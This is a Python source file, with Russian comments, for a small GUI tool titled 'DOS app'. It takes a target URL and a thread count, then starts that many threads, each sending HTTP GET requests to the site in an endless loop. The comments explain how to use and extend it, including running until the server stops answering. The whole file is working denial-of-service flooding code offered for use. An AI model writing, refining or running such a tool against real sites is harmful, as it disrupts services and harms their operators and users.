import tkinter
import tkinter.messagebox
import customtkinter
import subprocess

import colorama
import threading
import requests


# библиотека, которая упростит работу с цветами в консоли. Можете обойтись без неё, использую спец. символы консоли, как в .sh скриптах, либо всё сделать одного цвета.
# requests - библиотека, которая позволит отправлять post/get запросы на удаленный сервер.
# threading - библиотека, которая обеспечит многопоточность программы. Многопоточность увеличит скорость.


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        ###########################
        threads = 20
        url = ""
        ############################

        customtkinter.set_appearance_mode("System")
        customtkinter.set_default_color_theme("green")

        self.title("DOS app")

        #Статим размер
        self.minsize(width=300, height= 200)
        self.maxsize(width=300, height=200)
        # разметочка
        self.grid_columnconfigure((0), weight=1)
        self.grid_rowconfigure((0), weight=0)

        # В этой функции мы входим в бесконечный цикл (кстати он нам не страшен, так как у нас много потоков и это всё работает постоянно.), так как завершать работу программы
        # мы будем сочетанием клавиш ctrl+c. Так же вы можете модифицировать функцию, например как только сервер начал не отвечать прекратить работу. Ну это дело вкуса. Всё в ваших руках.
        def dos(target):
            while True:
                try:
                    res = requests.get(target)
                    print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
                except requests.exceptions.ConnectionError:
                    print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")

        # Теперь объясняю. Создаем переменную threads, в которой мы будем хранить количество потоков.
        # Я по умолчанию на 20 поставил. (Это не очень много, чисто поставил для примера).
        # Дальше объявили переменную url, в которую мы запишем домен цели.
        # Далее мы запрашиваем у пользователя количество потоков, которое он хотел бы использовать

        def button_callback():
            url = str(self.inputSite.get())
            threads = int(self.inputThreads.get())

            for i in range(0, threads):
                thr = threading.Thread(target=dos, args=(url,))
                thr.start()
                print(str(i + 1) + " thread started!")




        self.textLabel = customtkinter.CTkLabel(self,text = "Threads: ")
        self.textLabel.grid(row=0, column=0, padx=10, pady = 0)
        self.inputThreads = customtkinter.CTkEntry(self, placeholder_text="20")
        self.inputThreads.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")


        self.textLabel2 = customtkinter.CTkLabel(self, text="Site: ")
        self.textLabel2.grid(row=1, column=0, padx=0, pady=0, )
        self.inputSite = customtkinter.CTkEntry(self, placeholder_text="http://Site")
        self.inputSite.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")

        self.button = customtkinter.CTkButton(self, text= "Start", width= 200,command = button_callback)
        self.button.grid(row = 2, column = 1, padx=10, pady=10, sticky="nsew")



app = App()
app.mainloop()

